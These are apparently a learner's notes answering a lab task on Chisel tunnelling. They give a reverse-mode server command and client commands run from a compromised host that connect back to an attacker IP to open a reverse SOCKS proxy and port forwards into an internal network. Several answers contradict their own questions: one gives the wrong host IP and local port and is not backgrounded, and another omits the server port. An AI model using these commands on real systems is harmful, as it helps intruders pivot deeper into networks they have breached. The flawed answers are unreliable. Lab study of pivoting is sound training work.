- [x] Task:14 [[Chisel]]
Use port 4242 for the listener and **do not** background the process.
	./chisel server -p 4242 --reverse 
What command would you use to connect back to this server with a SOCKS proxy from a compromised host, assuming your own IP is 172.16.0.200 and backgrounding the process?
	./chisel client 172.16.0.200:4242 R:socks &
How would you forward 172.16.0.100:3306 to your own port 33060 using a chisel remote port forward, assuming your own IP is 172.16.0.200 and the listening port is 1337? Background this process.
	./chisel client 172.16.0.100:1337 R:3306:172.16.0.100:3306
If you have a chisel server running on port 4444 of 172.16.0.5, how could you create a local portforward, opening port 8000 locally and linking to 172.16.0.10:80?
	./chisel client 172.16.0.5 8000:172.16.0.10:80
